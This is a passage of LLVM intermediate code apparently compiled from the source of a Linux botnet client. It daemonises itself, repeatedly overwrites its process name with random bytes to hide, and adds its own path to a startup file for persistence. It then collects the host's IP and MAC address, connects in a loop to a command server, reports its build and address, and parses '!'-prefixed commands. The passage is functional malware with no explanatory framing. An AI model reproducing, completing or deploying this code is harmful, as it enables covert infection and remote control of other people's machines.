  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ifreq, align 8
  %14 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #12
  store i32 %14, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %18

17:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %109

18:                                               ; preds = %0
  %19 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %19, i8 0, i64 16, i1 false)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i64 0, i64 0)) #12
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = call zeroext i16 @htons(i16 noundef zeroext 53) #15
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* %2, align 4
  %27 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %28 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %28, %struct.sockaddr** %27, align 8
  %29 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %30 = load %struct.sockaddr*, %struct.sockaddr** %29, align 8
  %31 = call i32 @connect(i32 noundef %26, %struct.sockaddr* %30, i32 noundef 16)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

34:                                               ; preds = %18
  store i32 0, i32* %1, align 4
  br label %109

35:                                               ; preds = %18
  store i32 16, i32* %7, align 4
  %36 = load i32, i32* %2, align 4
  %37 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %38, %struct.sockaddr** %37, align 8
  %39 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %40 = load %struct.sockaddr*, %struct.sockaddr** %39, align 8
  %41 = call i32 @getsockname(i32 noundef %36, %struct.sockaddr* %40, i32* noundef %7) #12
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* %4, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %35
  store i32 0, i32* %1, align 4
  br label %109

45:                                               ; preds = %35
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %47 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %46, i32 0, i32 0
  %48 = load i32, i32* %47, align 4
  store i32 %48, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i64 0, i64 0), i32 noundef 0)
  store i32 %49, i32* %9, align 4
  br label %50

50:                                               ; preds = %71, %45
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %52 = load i32, i32* %9, align 4
  %53 = call i8* @fdgets(i8* noundef %51, i32 noundef 4096, i32 noundef %52)
  %54 = icmp ne i8* %53, null
  br i1 %54, label %55, label %73

55:                                               ; preds = %50
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %57 = call i8* @strstr(i8* noundef %56, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i64 0, i64 0)) #11
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %71

59:                                               ; preds = %55
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  store i8* %60, i8** %11, align 8
  br label %61

61:                                               ; preds = %66, %59
  %62 = load i8*, i8** %11, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 9
  br i1 %65, label %66, label %69

66:                                               ; preds = %61
  %67 = load i8*, i8** %11, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %11, align 8
  br label %61, !llvm.loop !77

69:                                               ; preds = %61
  %70 = load i8*, i8** %11, align 8
  store i8 0, i8* %70, align 1
  br label %73

71:                                               ; preds = %55
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %72, i8 0, i64 4096, i1 false)
  br label %50, !llvm.loop !78

73:                                               ; preds = %69, %50
  %74 = load i32, i32* %9, align 4
  %75 = call i32 @close(i32 noundef %74)
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %77 = load i8, i8* %76, align 16
  %78 = icmp ne i8 %77, 0
  br i1 %78, label %79, label %106

79:                                               ; preds = %73
  %80 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 0
  %81 = bitcast %union.anon.6* %80 to [16 x i8]*
  %82 = getelementptr inbounds [16 x i8], [16 x i8]* %81, i64 0, i64 0
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %84 = call i8* @strcpy(i8* noundef %82, i8* noundef %83) #12
  %85 = load i32, i32* %2, align 4
  %86 = call i32 (i32, i64, ...) @ioctl(i32 noundef %85, i64 noundef 35111, %struct.ifreq* noundef %13) #12
  store i32 0, i32* %12, align 4
  br label %87

87:                                               ; preds = %102, %79
  %88 = load i32, i32* %12, align 4
  %89 = icmp slt i32 %88, 6
  br i1 %89, label %90, label %105

90:                                               ; preds = %87
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i64 0, i64 0
  %95 = load i32, i32* %12, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  br label %102

102:                                              ; preds = %90
  %103 = load i32, i32* %12, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %12, align 4
  br label %87, !llvm.loop !79

105:                                              ; preds = %87
  br label %106

106:                                              ; preds = %105, %73
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 noundef %107)
  br label %109

109:                                              ; preds = %106, %44, %34, %17
  %110 = load i32, i32* %1, align 4
  ret i32 %110
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr*, i32* noundef) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32 noundef, i64 noundef, ...) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i64 0, i64 0)
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeFukdString(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* noundef null) #12
  %7 = trunc i64 %6 to i32
  call void @srand(i32 noundef %7) #12
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

8:                                                ; preds = %21, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %24

12:                                               ; preds = %8
  %13 = call i32 @rand() #12
  %14 = srem i32 %13, 223
  %15 = add nsw i32 %14, 33
  %16 = trunc i32 %15 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

21:                                               ; preds = %12
  %22 = load i32, i32* %5, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %5, align 4
  br label %8, !llvm.loop !80

24:                                               ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @touchMyself(i8** noundef %0) #0 {
  %2 = alloca i8**, align 8
  store i8** %0, i8*** %2, align 8
  %3 = call i32 @fork() #12
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %14, label %5

5:                                                ; preds = %1
  br label %6

6:                                                ; preds = %6, %5
  %7 = load i8**, i8*** %2, align 8
  %8 = getelementptr inbounds i8*, i8** %7, i64 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i32 @rand() #12
  %11 = srem i32 %10, 128
  %12 = add nsw i32 1024, %11
  call void @makeFukdString(i8* noundef %9, i32 noundef %12)
  %13 = call i32 @sleep(i32 noundef 3)
  br label %6

14:                                               ; preds = %1
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [256 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca %struct._IO_FILE*, align 8
  %16 = alloca [256 x i8], align 16
  %17 = alloca [1024 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [1024 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [10 x i8*], align 16
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %36 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i64 0, i64 0))
  %37 = call i32 @getpid() #12
  store i32 %37, i32* @actualparent, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %38 = call i32 @fork() #12
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %2
  call void @exit(i32 noundef 1) #16
  unreachable

42:                                               ; preds = %2
  %43 = load i32, i32* %6, align 4
  %44 = icmp sgt i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %42
  call void @exit(i32 noundef 0) #16
  unreachable

46:                                               ; preds = %42
  %47 = call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 noundef 0)
  %48 = call i32 @setsid() #12
  store i32 %48, i32* %7, align 4
  %49 = load i32, i32* %7, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @exit(i32 noundef 1) #16
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @chdir(i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #12
  %54 = call i32 @close(i32 noundef 0)
  %55 = call i32 @close(i32 noundef 1)
  %56 = call i32 @close(i32 noundef 2)
  %57 = bitcast i8*** %5 to i8**
  call void @touchMyself(i8** noundef %57)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i8** %8, align 8
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @strlen(i8* noundef %63) #11
  %65 = call i8* @strncpy(i8* noundef %60, i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i64 noundef %64) #12
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i8** %67, align 8
  %68 = call i64 @time(i64* noundef null) #12
  %69 = call i32 @getpid() #12
  %70 = sext i32 %69 to i64
  %71 = xor i64 %68, %70
  %72 = trunc i64 %71 to i32
  call void @srand(i32 noundef %72) #12
  %73 = call i64 @time(i64* noundef null) #12
  %74 = call i32 @getpid() #12
  %75 = sext i32 %74 to i64
  %76 = xor i64 %73, %75
  %77 = trunc i64 %76 to i32
  call void @init_rand(i32 noundef %77)
  store i32 0, i32* %12, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i64 0, i64 0), i8** %14, align 8
  %78 = load i8*, i8** %14, align 8
  %79 = call noalias %struct._IO_FILE* @fopen(i8* noundef %78, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  store %struct._IO_FILE* %79, %struct._IO_FILE** %15, align 8
  %80 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %81 = icmp eq %struct._IO_FILE* %80, null
  br i1 %81, label %82, label %85

82:                                               ; preds = %52
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i64 0, i64 0), i8** %14, align 8
  %83 = load i8*, i8** %14, align 8
  %84 = call noalias %struct._IO_FILE* @fopen(i8* noundef %83, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  store %struct._IO_FILE* %84, %struct._IO_FILE** %15, align 8
  br label %85

85:                                               ; preds = %82, %52
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %87 = icmp ne %struct._IO_FILE* %86, null
  br i1 %87, label %88, label %165

88:                                               ; preds = %85
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i64 @strlen(i8* noundef %91) #11
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %95 = call i8* @getcwd(i8* noundef %94, i64 noundef 256) #12
  %96 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %97 = call i32 @strcmp(i8* noundef %96, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #11
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %99, label %161

99:                                               ; preds = %88
  br label %100

100:                                              ; preds = %110, %99
  %101 = load i8**, i8*** %5, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %18, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp ne i32 %108, 47
  br i1 %109, label %110, label %113

110:                                              ; preds = %100
  %111 = load i32, i32* %18, align 4
  %112 = add nsw i32 %111, -1
  store i32 %112, i32* %18, align 4
  br label %100, !llvm.loop !81

113:                                              ; preds = %100
  %114 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 0
  %115 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 0
  %118 = load i8*, i8** %117, align 8
  %119 = load i32, i32* %18, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %114, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i64 0, i64 0), i8* noundef %115, i8* noundef %121) #12
  br label %123

123:                                              ; preds = %139, %113
  %124 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %125 = call i32 @feof(%struct._IO_FILE* noundef %124) #12
  %126 = icmp ne i32 %125, 0
  %127 = xor i1 %126, true
  br i1 %127, label %128, label %140

128:                                              ; preds = %123
  %129 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i64 0, i64 0
  %130 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %131 = call i8* @fgets(i8* noundef %129, i32 noundef 1024, %struct._IO_FILE* noundef %130)
  %132 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i64 0, i64 0
  %133 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 0
  %134 = call i32 @strcasecmp(i8* noundef %132, i8* noundef %133) #11
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %139, label %136

136:                                              ; preds = %128
  %137 = load i32, i32* %19, align 4
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* %19, align 4
  br label %139

139:                                              ; preds = %136, %128
  br label %123, !llvm.loop !82

140:                                              ; preds = %123
  %141 = load i32, i32* %19, align 4
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %157

143:                                              ; preds = %140
  %144 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %145 = call i32 @fclose(%struct._IO_FILE* noundef %144)
  %146 = load i8*, i8** %14, align 8
  %147 = call noalias %struct._IO_FILE* @fopen(i8* noundef %146, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i64 0, i64 0))
  store %struct._IO_FILE* %147, %struct._IO_FILE** %20, align 8
  %148 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %149 = icmp ne %struct._IO_FILE* %148, null
  br i1 %149, label %150, label %156

150:                                              ; preds = %143
  %151 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 0
  %152 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %153 = call i32 @fputs(i8* noundef %151, %struct._IO_FILE* noundef %152)
  %154 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %155 = call i32 @fclose(%struct._IO_FILE* noundef %154)
  br label %156

156:                                              ; preds = %150, %143
  br label %160

157:                                              ; preds = %140
  %158 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %159 = call i32 @fclose(%struct._IO_FILE* noundef %158)
  br label %160

160:                                              ; preds = %157, %156
  br label %164

161:                                              ; preds = %88
  %162 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %163 = call i32 @fclose(%struct._IO_FILE* noundef %162)
  br label %164

164:                                              ; preds = %161, %160
  br label %165

165:                                              ; preds = %164, %85
  %166 = call i32 @getOurIP()
  %167 = call i32 @fork() #12
  store i32 %167, i32* %9, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %172

169:                                              ; preds = %165
  %170 = load i32, i32* %9, align 4
  %171 = call i32 @waitpid(i32 noundef %170, i32* noundef %11, i32 noundef 0)
  call void @exit(i32 noundef 0) #16
  unreachable

172:                                              ; preds = %165
  %173 = load i32, i32* %9, align 4
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %187, label %175

175:                                              ; preds = %172
  %176 = call i32 @fork() #12
  store i32 %176, i32* %10, align 4
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %178, label %179

178:                                              ; preds = %175
  call void @exit(i32 noundef 0) #16
  unreachable

179:                                              ; preds = %175
  %180 = load i32, i32* %10, align 4
  %181 = icmp ne i32 %180, 0
  br i1 %181, label %183, label %182

182:                                              ; preds = %179
  br label %185

183:                                              ; preds = %179
  %184 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i64 0, i64 0))
  br label %185

185:                                              ; preds = %183, %182
  br label %186

186:                                              ; preds = %185
  br label %189

187:                                              ; preds = %172
  %188 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i64 0, i64 0))
  br label %189

189:                                              ; preds = %187, %186
  br label %190

190:                                              ; preds = %189
  %191 = call i32 @setsid() #12
  %192 = call i32 @chdir(i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #12
  %193 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #12
  br label %194

194:                                              ; preds = %497, %197, %190
  %195 = call i32 @initConnection()
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %199

197:                                              ; preds = %194
  %198 = call i32 @sleep(i32 noundef 30)
  br label %194

199:                                              ; preds = %194
  %200 = load i32, i32* @mainCommSock, align 4
  %201 = call i8* @getBuild()
  %202 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %203 = call i8* @inet_ntoa(i32 %202) #12
  %204 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %200, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i64 0, i64 0), i8* noundef %201, i8* noundef %203)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %205

205:                                              ; preds = %496, %415, %337, %292, %199
  %206 = load i32, i32* @mainCommSock, align 4
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %208 = call i32 @recvLine(i32 noundef %206, i8* noundef %207, i32 noundef 4096)
  store i32 %208, i32* %22, align 4
  %209 = icmp ne i32 %208, -1
  br i1 %209, label %210, label %497

210:                                              ; preds = %205
  store i32 0, i32* %23, align 4
  br label %211

211:                                              ; preds = %280, %210
  %212 = load i32, i32* %23, align 4
  %213 = load i32, i32* @numpids, align 4
  %214 = icmp slt i32 %212, %213
  br i1 %214, label %215, label %283

215:                                              ; preds = %211
  %216 = load i32*, i32** @pids, align 8
  %217 = load i32, i32* %23, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @waitpid(i32 noundef %220, i32* noundef null, i32 noundef 1)
  %222 = icmp sgt i32 %221, 0
  br i1 %222, label %223, label %279

223:                                              ; preds = %215
  %224 = load i32, i32* %23, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %25, align 4
  br label %226

226:                                              ; preds = %241, %223
  %227 = load i32, i32* %25, align 4
  %228 = load i32, i32* @numpids, align 4
  %229 = icmp ult i32 %227, %228
  br i1 %229, label %230, label %244

230:                                              ; preds = %226
  %231 = load i32*, i32** @pids, align 8
  %232 = load i32, i32* %25, align 4
  %233 = zext i32 %232 to i64
  %234 = getelementptr inbounds i32, i32* %231, i64 %233
  %235 = load i32, i32* %234, align 4
  %236 = load i32*, i32** @pids, align 8
  %237 = load i32, i32* %25, align 4
  %238 = sub i32 %237, 1
  %239 = zext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %236, i64 %239
  store i32 %235, i32* %240, align 4
  br label %241

241:                                              ; preds = %230
  %242 = load i32, i32* %25, align 4
  %243 = add i32 %242, 1
  store i32 %243, i32* %25, align 4
  br label %226, !llvm.loop !83

244:                                              ; preds = %226
  %245 = load i32*, i32** @pids, align 8
  %246 = load i32, i32* %25, align 4
  %247 = sub i32 %246, 1
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %245, i64 %248
  store i32 0, i32* %249, align 4
  %250 = load i32, i32* @numpids, align 4
  %251 = add nsw i32 %250, -1
  store i32 %251, i32* @numpids, align 4
  %252 = load i32, i32* @numpids, align 4
  %253 = add nsw i32 %252, 1
  %254 = sext i32 %253 to i64
  %255 = mul i64 %254, 4
  %256 = call noalias i8* @malloc(i64 noundef %255) #12
  %257 = bitcast i8* %256 to i32*
  store i32* %257, i32** %24, align 8
  store i32 0, i32* %25, align 4
  br label %258

258:                                              ; preds = %272, %244
  %259 = load i32, i32* %25, align 4
  %260 = load i32, i32* @numpids, align 4
  %261 = icmp ult i32 %259, %260
  br i1 %261, label %262, label %275

262:                                              ; preds = %258
  %263 = load i32*, i32** @pids, align 8
  %264 = load i32, i32* %25, align 4
  %265 = zext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  %267 = load i32, i32* %266, align 4
  %268 = load i32*, i32** %24, align 8
  %269 = load i32, i32* %25, align 4
  %270 = zext i32 %269 to i64
  %271 = getelementptr inbounds i32, i32* %268, i64 %270
  store i32 %267, i32* %271, align 4
  br label %272

272:                                              ; preds = %262
  %273 = load i32, i32* %25, align 4
  %274 = add i32 %273, 1
  store i32 %274, i32* %25, align 4
  br label %258, !llvm.loop !84

275:                                              ; preds = %258
  %276 = load i32*, i32** @pids, align 8
  %277 = bitcast i32* %276 to i8*
  call void @free(i8* noundef %277) #12
  %278 = load i32*, i32** %24, align 8
  store i32* %278, i32** @pids, align 8
  br label %279

279:                                              ; preds = %275, %215
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %23, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %23, align 4
  br label %211, !llvm.loop !85

283:                                              ; preds = %211
  %284 = load i32, i32* %22, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %285
  store i8 0, i8* %286, align 1
  %287 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  call void @trim(i8* noundef %287)
  %288 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %289 = call i8* @strstr(i8* noundef %288, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0)) #11
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %291 = icmp eq i8* %289, %290
  br i1 %291, label %292, label %295

292:                                              ; preds = %283
  %293 = load i32, i32* @mainCommSock, align 4
  %294 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %293, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i64 0, i64 0))
  br label %205, !llvm.loop !86

295:                                              ; preds = %283
  %296 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %297 = call i8* @strstr(i8* noundef %296, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i64 0, i64 0)) #11
  %298 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %299 = icmp eq i8* %297, %298
  br i1 %299, label %300, label %308

300:                                              ; preds = %295
  %301 = load i32, i32* %12, align 4
  %302 = add nsw i32 %301, 1
  store i32 %302, i32* %12, align 4
  %303 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i64 0, i64 0))
  %304 = load i32, i32* %12, align 4
  %305 = icmp sgt i32 %304, 20
  br i1 %305, label %306, label %307

306:                                              ; preds = %300
  call void @exit(i32 noundef 0) #16
  unreachable

307:                                              ; preds = %300
  br label %497

308:                                              ; preds = %295
  %309 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  store i8* %309, i8** %26, align 8
  %310 = load i8*, i8** %26, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 33
  br i1 %313, label %314, label %496

314:                                              ; preds = %308
  %315 = load i8*, i8** %26, align 8
  %316 = getelementptr inbounds i8, i8* %315, i64 1
  store i8* %316, i8** %27, align 8
  br label %317

317:                                              ; preds = %329, %314
  %318 = load i8*, i8** %27, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp ne i32 %320, 32
  br i1 %321, label %322, label %327

322:                                              ; preds = %317
  %323 = load i8*, i8** %27, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp ne i32 %325, 0
  br label %327

327:                                              ; preds = %322, %317
  %328 = phi i1 [ false, %317 ], [ %326, %322 ]
  br i1 %328, label %329, label %332

